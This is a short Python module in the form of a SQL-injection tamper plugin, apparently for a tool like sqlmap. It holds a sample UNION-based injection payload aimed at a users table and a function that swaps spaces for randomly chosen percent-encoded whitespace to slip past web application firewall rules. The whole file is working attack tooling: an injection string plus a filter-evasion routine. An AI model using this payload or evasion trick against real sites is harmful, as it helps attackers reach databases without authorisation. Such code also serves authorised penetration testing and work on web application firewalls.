import random

__example_payload__ = "' UNION SELECT NULL FROM users--"
__type__ = "replace whitespace with percent-encoded whitespace (%20/%09) to dodge space-aware rules"
__category__ = "encoding"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

SPACE_VARIANTS = ("%20", "%09", "%0b", "%0c")


def tamper(payload, **kwargs):
    if not payload:
        return payload
    return payload.replace(" ", random.choice(SPACE_VARIANTS))
